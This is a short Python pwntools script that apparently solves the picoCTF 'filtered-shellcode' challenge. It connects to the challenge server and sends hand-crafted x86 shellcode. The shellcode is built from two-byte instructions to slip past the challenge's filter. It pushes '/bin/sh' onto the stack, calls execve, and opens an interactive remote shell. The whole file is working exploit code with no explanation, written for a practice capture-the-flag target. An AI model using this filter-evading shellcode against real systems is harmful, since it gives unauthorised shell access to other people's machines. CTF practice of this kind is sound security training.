import os
from pwn import *
###################setup file and elf files####################
level = "filtered-shellcode"
ip = "mercury.picoctf.net:37853"
os.chdir("/home/ayush/Work/picoCTF/BinaryExploitation/"+level)
print(os.getcwd())

######################start process##########################

# r = process("./fun")
r = remote(ip.split(':')[0], ip.split(':')[1])

#####################simple interactions to solve###################### 
shellcode = b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb3\x10\x04\x00\xf7\xe3\xf7\xe3\x04\x68\xf7\xe3\xf7\xe3\x04\x73\xf7\xe3\xf7\xe3\x04\x2f\x50\x90\x31\xc0\x04\x6e\xf7\xe3\xf7\xe3\x04\x69\xf7\xe3\xf7\xe3\x04\x62\xf7\xe3\xf7\xe3\x04\x2f\x50\x90\x89\xe3\x31\xc0\xb0\x0b\xcd\x80"

r.sendlineafter(":", shellcode)
log.info(r.recv())
r.interactive()